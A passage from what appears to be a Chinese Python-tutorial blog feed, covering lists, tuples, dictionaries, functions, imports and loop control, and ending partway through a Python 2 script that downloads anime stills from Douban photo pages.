class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的列表、元组和字典</title>
      <link href="/posts/10c43bcf.html"/>
      <url>/posts/10c43bcf.html</url>
      
        <content type="html"><![CDATA[<h1 id="列表："><a href="#列表：" class="headerlink" title="列表："></a>列表：</h1><p>在Python中序列是最基本的数据结构。最为常见的序列是列表和元组，这些序列提供了很多便利的操作。</p><p>列表以左括号开始，右括号结束，央视44样式为[‘Nmap’,’Kali’,’Openvas’]。列表中的数据项无需相同，对于一个列表而言，可以进行以下操作：</p><p>  首先，创建一个以tools为名的列表</p><pre class="line-numbers language-python"><code class="language-python">tools<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'Nmap'</span><span class="token punctuation">,</span><span class="token string">'Kali'</span><span class="token punctuation">,</span><span class="token string">'Openvas'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>使用下标访问列表，只要使用下标，就可以对列表中的数据进行读取和修改。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200117175049645.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">. </li><li>使用切片来访问列表，使用下标只能访问单个元素，使用切片可以取得多个元素，得到一个新的列表。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200117175359926.PNG" alt="在这里插入图片描述"><br>在一个切片中，第一个整数是切片开始的下标，第二个整数是切片结束的下标，但不包括这个下标。</li><li>使用len()取得列表的长度<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200117175820254.PNG" alt="在这里插入图片描述"></li><li>列表的连接和复制操作。列表支持‘+’和‘<em>’两个运算符‘+’表示连接运算符。例如，将tools和列表[‘Sqlmap’,’Zmap’]组成一个新的列表。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200117180227916.PNG" alt="在这里插入图片描述">另外也可以使用</em>这个运算符实现对列表的复制，例如tools*3就是复制‘tools’这个列表三次</li><li>in操作符与not in操作符，这两个运算符可以确定一个值是否在列表中。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200117180945201.PNG" alt="在这里插入图片描述"></li><li>删除列表元素使用del语句，例如删除tools列表中的Kali元素，可以使用如下语句<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200117181300305.PNG" alt="在这里插入图片描述"></li><li>Pythoh 中还支持一些操作的函数。常用的函数有如下几个: index ( obj)在列表中查找指定值，如果这个值存在于列表中，就返回它的下标; append ( obj)在列表的末尾添加指定对象; insert ( index, obj) 将指定对象插入到列表的index位置; remove (obj) 将列表中的特定值删除; sort() 对列表中的元素进行排序。<h2 id="元组："><a href="#元组：" class="headerlink" title="元组："></a>元组：</h2>元组这个数据类型和列表的大部分性质都是相同的，不同之处只有以下两点。</li><li>元组使用的是圆括号(), 而列表使用的是方括号[]。</li><li>元组中的元素是不能被修改的。<h2 id="字典："><a href="#字典：" class="headerlink" title="字典："></a>字典：</h2>字典数据类型提供了更为灵活访问和组织数据的方式，它可以存储任意类型的数据。字典可以使用索引进行操作，不过这些索引的类型并不–定要是整数，也可以是不同的数据类型。字典类型用大括号表示，字典中的索引称为键，这些键和对应的值共同构成了一个“键;值”，键和值用冒号分隔，格式如下所示。</li></ol><pre class="line-numbers language-python"><code class="language-python">Score<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LiMing'</span><span class="token punctuation">:</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token string">'WangGang'</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">'ChenKe'</span><span class="token punctuation">:</span><span class="token number">90</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>keys()，将整个字典中的键以列表形式返回</li><li>values()，将整个字典中的值以列表形式返回。</li><li>items(),将整个字典中的“键-值”以列表形式返回。</li><li>has_ key(, 检查-一个键是否存在于字典中，如果存在则返回true, 否则返回false。</li><li>get()，检查-一个键是否存在于字典中，如果存在则返回该键对应的值，否则返回备用值，所以这个函数需要两个参数，-个是要查找的键，另一个是备用值。字典的值还可以是任意的数值类型，在本书后面的实例中会多次使用列表和字典作为字典的值。</li></ol><p> <strong>注：第四条在Python3中已经废除，不可以再使用了，但是在Python2中还可以使用。</strong></p><p>. </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的函数与模块</title>
      <link href="/posts/488d91ba.html"/>
      <url>/posts/488d91ba.html</url>
      
        <content type="html"><![CDATA[<p>Python中的函数可以分为两种：一种是Python中内置的函数，例如众所周知的print()；而另一种就是自定义函数。<br>编写一个函数很简单，Python中的函数一般包含以下五个部分。</p><ol><li>函数的标识符。首先要用def来创建一个函数，这里的def就是标识符（define的缩写）</li><li>函数名。每一个函数都要有一个名字，最好这个函数名字能体现出他的作用。</li><li>函数的参数。如果将函数比作一个机器，那么参数就是放入这个机器的原料。函数的参数需要放在()中。</li><li>函数体。这部分是函数的主体，里面是实现函数功能的代码。但是函数体的语句需要相对函数标识符缩进。</li><li>函数的return语句。表示函数结束，可以返回一个值，若没有return语句，则返回None。<br>下面定义一个计算平方的函数：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">square</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">=</span> x<span class="token operator">**</span><span class="token number">2</span>    <span class="token keyword">return</span> y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果需要使用这个函数，只需要使用这个函数名和参数即可，例如计算99的平方，只需要输入square(99)即可。</p><p>除了加上定义的函数之外，Python还支持匿名函数的使用。匿名函数使用lambda关键字创建。Python中Lambda表达式的形式如下所示：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200117232200475.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>在Python中Lambada表达式用于简单的函数，例如，上例中的square函数就可以写成下面的形式，输出的结果是一样的。</p><p>如果将一些经常使用的函数编写到一个Python文件中，在任何程序中都可以调用这些函数，则会更加方便，C语言的头文件以及JAVA中的包就实现了这样的功能，在Python中，这种文件称为模块，学过C的一定对#include&lt;stdio.h&gt;这句不陌生，而Python中就是import语句。</p><h2 id="0x01-import语句"><a href="#0x01-import语句" class="headerlink" title="0x01 import语句"></a>0x01 import语句</h2><p>如果希望引入某一个模块，可以使用import加上模块的名字，例如要引用Socket模块，就可以使用：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> socket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果要同时引用多个模块，可以使用逗号隔开：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> socker<span class="token punctuation">,</span>random<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样引用之后，再调用模块中的函数时，必须使用“模块名.函数名”来引用。</p><h2 id="0x02-from…import语句"><a href="#0x02-from…import语句" class="headerlink" title="0x02 from…import语句"></a>0x02 from…import语句</h2><p>一个模块可能包含大量函数，但是一个程序又不会使用它的全部函数，而是用哪个引入那个，这时候就要使用from···import语句。例如，只需要引入scapy.all模块中的srp函数，就可以使用以下语句：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> srp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过这种方式引入的时候，调用韩式时只需要给出函数名，不需要给出模块名。如果需要把一个模块的所有内容全部导入，使用的语句只需将函数名写成*即可。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>import 模块</strong>：导入一个模块；注：相当于导入的是一个文件夹，是个相对路径。</li><li><strong>from…import</strong>：导入了一个模块中的一个函数；注：相当于导入的是一个文件夹中的文件，是个绝对路径。 </li><li><strong>from…import*</strong>：是把一个模块中所有函数都导入进来; 注：相当于：相当于导入的是一个文件夹中所有文件，所有函数都是绝对路径。</li></ul><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>from…import *语句与import区别在于：</p><ol><li>import 导入模块，每次使用模块中的函数都要是定是哪个模块。（哪个文件夹中的哪个文件）</li><li>from…import * 导入模块，每次使用模块中的函数，直接使用函数就可以了；注因为已经知道该函数是那个模块中的了。（已经绑定了文件夹，只需要知道要用哪个文件即可）</li></ol><p>例如：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>注：因randint()函数属于random模块，必须在函数名称之前先加上random，告诉Python在random这个“文件夹”中寻找这个randint()这个“文件”。</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> random <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>注：这里我们没有加random这个前缀，直接引用了randint()这个函数，这是因为我们已经给这个程序绑定了random这个“文件夹”，我们只需要告诉程序我们要使用这个“文件夹”下面的randeint()这个“文件”即可。</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的continue与break</title>
      <link href="/posts/4288d5.html"/>
      <url>/posts/4288d5.html</url>
      
        <content type="html"><![CDATA[<h2 id="continue的用法："><a href="#continue的用法：" class="headerlink" title="continue的用法："></a>continue的用法：</h2><pre class="line-numbers language-python"><code class="language-python">conunt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> count <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我不会被输出'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输出结束'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上面这段代码中，continue前面的代码会循环9次，一直到count=10的时候，不符合while条件，跳出循环，输出结束。而continue后面的代码则永远不会输出，因为while的代码块运行到continue时就会弹回去重新进行一次循环。</p><h2 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200117164141786.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="break的用法："><a href="#break的用法：" class="headerlink" title="break的用法："></a>break的用法：</h2><pre class="line-numbers language-python"><code class="language-python">conunt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> count <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> count <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我不会被输出'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输出结束'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是这段代码，我们直接运行看下效果就明白他们两个的区别是什么了，它并没有弹回去在进行一次循环，而是代码运行到break哪里的时候直接跳出了整个while循环。</p><h2 id="效果：-1"><a href="#效果：-1" class="headerlink" title="效果："></a>效果：</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200117164617293.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol><li>break：跳出整个循环<br>continue：跳出本次循环，进行下一次的循环</li><li>break和continue只能用于循环中，不可单独使用</li><li>在嵌套循环中，break和continue只会对最近的一层循环起作用，也就是近原则</li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬取豆瓣裤袜视界高清大图</title>
      <link href="/posts/9304a3f.html"/>
      <url>/posts/9304a3f.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote><p>今天刚好有个朋友托我写一个脚本，需求是爬取他刚看的一部动漫的剧照，于是我就开始着手满足他这个需求哈哈哈~因为这个脚本涉及到一些批量拿站也会用到的模块，所以就归类到Python渗透编程里了，我会分3步简要的说一下这个脚本的编写思路。</p></blockquote><h3 id="第一步：整合URL"><a href="#第一步：整合URL" class="headerlink" title="第一步：整合URL"></a>第一步：整合URL</h3><p>我首先看了一下网站的URL结构，这种爬图的活儿有点像套娃，需要一层一层的去进行数据清洗，直到得到真正的地址.jpg</p><p>其实脚本很好理解，需要你掌握Python的正则，我这里有本详细的Python正则等待你的查收！<br><a href="https://blog.csdn.net/qq_43573676/article/details/106952407" target="_blank" rel="noopener">Python正则武林秘籍</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201014001359214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里还需要翻页，所以要做两个正则，分两次for循环传递<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201014001516555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>右键去看一下源码，构思一下正则<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201013225652290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这样第一步的代码就出来了：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#get_num()的作用是整合裤袜视界全部图片的url</span><span class="token keyword">def</span> <span class="token function">get_num</span><span class="token punctuation">(</span>url1<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://movie.douban.com/subject/30419644/photos?type=S'</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    html <span class="token operator">=</span> req<span class="token punctuation">.</span>text    page <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;a href=\"https://movie\.douban\.com/photos/photo/(.*?)\">'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    pages <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;a href=\"(.*?)\" >\d&lt;/a>'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 这里过滤一下需要跳转的页面的url，传给turn_page()进行处理</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> pages<span class="token punctuation">:</span>        turn_page<span class="token punctuation">(</span>j<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#在这里把过滤出来的url列表赋值给i，拼接后传递给函数get_img_url()</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> page<span class="token punctuation">:</span>        url2 <span class="token operator">=</span> url1<span class="token operator">+</span>i        get_img_url<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是自动翻页的代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 这里获取翻页的url并进行二次处理</span><span class="token keyword">def</span> <span class="token function">turn_page</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> <span class="token string">'https://movie.douban.com/photos/photo/'</span>    url <span class="token operator">=</span> page    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    html <span class="token operator">=</span> req<span class="token punctuation">.</span>text    pages <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;a href=\"https://movie\.douban\.com/photos/photo/(.*?)\">'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> pages<span class="token punctuation">:</span>        url2 <span class="token operator">=</span> host<span class="token operator">+</span>j        get_img_url<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第二步：过滤URL"><a href="#第二步：过滤URL" class="headerlink" title="第二步：过滤URL"></a>第二步：过滤URL</h3><p>整合完url后，点进去发现还需要再深入的整合一遍<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201013230059250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>于是再一次的去构造正则<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201013230308337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>第三段代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#这里做了一次数据清洗，从传递过来的url中爬取图片的真实url</span><span class="token keyword">def</span> <span class="token function">get_img_url</span><span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">:</span>    req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url2<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    html <span class="token operator">=</span> req<span class="token punctuation">.</span>text    url <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;img src=\"(.*?)\" width=\"686\" />'</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    down_img<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="第三步：批量下载图片"><a href="#第三步：批量下载图片" class="headerlink" title="第三步：批量下载图片"></a>第三步：批量下载图片</h3><p>这里经过最终的过滤后，获取到真正的图片.jpg，下载，收工！<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201014002826998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 最后把处理好的url，再进行一次清洗，得到真正的图片地址~</span><span class="token keyword">def</span> <span class="token function">down_img</span><span class="token punctuation">(</span>url3<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 用for循环接收传递过来的url列表</span>    <span class="token keyword">for</span> img_url <span class="token keyword">in</span> url3<span class="token punctuation">:</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>img_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        img <span class="token operator">=</span> req<span class="token punctuation">.</span>content        img_url <span class="token operator">=</span> img_url        <span class="token comment" spellcheck="true"># 这里为了避免图片因重名而覆盖，采用split()方式分割取值来命名</span>        img_name <span class="token operator">=</span> img_url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        local_name <span class="token operator">=</span> <span class="token string">'/'</span><span class="token operator">+</span><span class="token string">'Pantyhose'</span><span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>img_name        <span class="token comment" spellcheck="true"># 这里就开始下载了~最后为了避免被封IP，sleep了一下</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>local_name<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'正在下载{}......'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>local_name<span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>img<span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">'下载完毕，请查看！'</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h3><p><strong>注：这里的解释器是Python2.7，不是3.8，用Python3的同学得改一下代码！</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2020/10/13 16:50</span><span class="token comment" spellcheck="true"># @Author  : Shadow</span><span class="token comment" spellcheck="true"># @Site    : </span><span class="token comment" spellcheck="true"># @File    : Panty_hose.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token comment" spellcheck="true"># 建议从底部开始食用</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> os<span class="token keyword">import</span> time<span class="token comment" spellcheck="true"># 最后把处理好的url，再进行一次清洗，得到真正的图片地址~</span><span class="token keyword">def</span> <span class="token function">down_img</span><span class="token punctuation">(</span>url3<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 用for循环接收传递过来的url列表</span>    <span class="token keyword">for</span> img_url <span class="token keyword">in</span> url3<span class="token punctuation">:</span>        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>img_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>        img <span class="token operator">=</span> req<span class="token punctuation">.</span>content        img_url <span class="token operator">=</span> img_url        <span class="token comment" spellcheck="true"># 这里为了避免图片因重名而覆盖，采用split()方式分割取值来命名</span>        img_name <span class="token operator">=</span> img_url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        local_name <span class="token operator">=</span> <span class="token string">'/'</span><span class="token operator">+</span><span class="token string">'Pantyhose'</span><span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>img_name        <span class="token comment" spellcheck="true"># 这里就开始下载了~最后为了避免被封IP，sleep了一下</span>        <span class="token keyword">with</span> open<span class="token punctuation">(</span>local_name<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">'正在下载{}......'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>local_name<span class="token punctuation">)</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>img<span class="token 